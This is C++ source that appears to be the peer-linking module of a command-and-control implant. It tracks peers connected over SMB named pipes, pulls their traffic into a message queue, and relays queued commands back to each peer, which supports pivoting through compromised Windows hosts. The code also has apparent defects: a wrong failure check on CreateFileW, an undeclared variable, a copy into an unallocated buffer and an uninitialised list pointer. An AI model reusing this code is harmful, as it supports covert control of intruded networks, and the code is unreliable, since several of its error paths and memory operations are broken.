#include <core/include/peers.hpp>
using namespace Stream;
using namespace Dispatcher;
using namespace Network::Smb;

namespace Peers {

    _peer_data* GetPeer(const uint32_t peer_id) {
        auto head = Ctx->clients;
        do {
            if (head) {
                if (head->peer_id == peer_id) {
                    return head;
                }
                head = head->next;
            }
            else {
                return nullptr;
            }
        }
        while (true);
    }

    BOOL RemovePeer(const uint32_t peer_id) {

        _peer_data *head   = Ctx->clients;
        _peer_data *target = GetPeer(peer_id);
        _peer_data *prev   = nullptr;

	    if (!head || !target) {
	        return false;
	    }

        while (head) {
            if (head == target) {
                if (prev) {
                    prev->next = head->next;
                }
                else {
                    Ctx->clients = head->next;
                }
                if (head->pipe_name) {
                    MemSet(head->pipe_name, 0, WcsLength(head->pipe_name));
                    Free(head->pipe_name);
                }
                if (head->pipe_handle) {
                    Ctx->nt.NtClose(head->pipe_handle);
                    head->pipe_handle = nullptr;
                }

                head->peer_id = 0;
                return true;
            }

            prev = head;
            head = head->next;
        }

        return false;
    }

    BOOL AddPeer(const wchar_t *pipe_name, const uint32_t peer_id) {

        _stream *in         = nullptr;
        _peer_data *client  = nullptr;
        _peer_data *head    = nullptr;

        DWORD total  = 0;
        DWORD read   = 0;

        void *handle = nullptr;
        void *buffer = nullptr;

        // first contact
        if (!(handle = Ctx->win32.CreateFileW(pipe_name, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
            if (handle == INVALID_HANDLE_VALUE) {
                return false;
            }

            if (ntstatus == ERROR_PIPE_BUSY) {
                if (!Ctx->win32.WaitNamedPipeW(pipe_name, 5000)) {
                    Ctx->nt.NtClose(handle);
                    return false;
                }
            }
        }

        do {
            if (Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &total, nullptr)) {
                if (total) {
                    in      = CreateStream();
                    buffer  = Malloc(total);

                    if (!Ctx->win32.ReadFile(handle, buffer, total, &read, nullptr) || read != total) {
                        Ctx->nt.NtClose(handle);
                        return false;
                    }

                    in->buffer = B_PTR(buffer);
                    in->length += total;

                    MessageQueue(in);
                    break;
                }
            }
        }
        while (true);

        client = (_peer_data*) Malloc(sizeof(_peer_data));
        client->pipe_handle = handle;

        MemCopy(&client->peer_id, &peer_id, sizeof(uint32_t));
        MemCopy(client->pipe_name, pipe_name, WcsLength(pipe_name) * sizeof(wchar_t));

        if (!Ctx->clients) {
            Ctx->clients = client;
        }
        else {
            head = Ctx->clients;
            do {
                if (head) {
                    if (head->next) {
                        head = head->next;
                    }
                    else {
                        head->next = client;
                        break;
                    }
                }
                else {
                    break;
                }
            }
            while (true);
        }
        return true;
    }

    VOID PushPeers() {

        _stream *in     = nullptr;
        void *buffer    = nullptr;

        uint8_t bound = 0;
        DWORD total  = 0;
        DWORD read   = 0;

        for (auto client = Ctx->clients; client; client = client->next) {
            if (!Ctx->win32.PeekNamedPipe(client->pipe_handle, &bound, sizeof(uint8_t), nullptr, &read, nullptr) || read != sizeof(uint8_t) ||
                !Ctx->win32.PeekNamedPipe(client->pipe_handle, nullptr, 0, nullptr, &total, nullptr)) {
                continue;
            }

            if (bound == EGRESS && total >= sizeof(uint32_t)) {
                in     = CreateStream();
                buffer = Malloc(total);

                if (!Ctx->win32.ReadFile(client->pipe_handle, buffer, total, &read, nullptr) || read != total) {

                    DestroyStream(in);
                    Free(buffer);
                    continue;
                }

                in->buffer = B_PTR(buffer);
                in->length += total;

                MessageQueue(in);

            }
            else {
                continue;
            }

            for (auto message = Ctx->transport.outbound_queue; message; message = message->next) {
                if (message->buffer && B_PTR(message->buffer)[0] == INGRESS) {

                    if (PeekPeerId(message) == client->peer_id) {
                        if (PipeWrite(client->pipe_handle, message)) {
                            RemoveMessage(message);
                        }
                    }
                }
            }
        }
    }
}
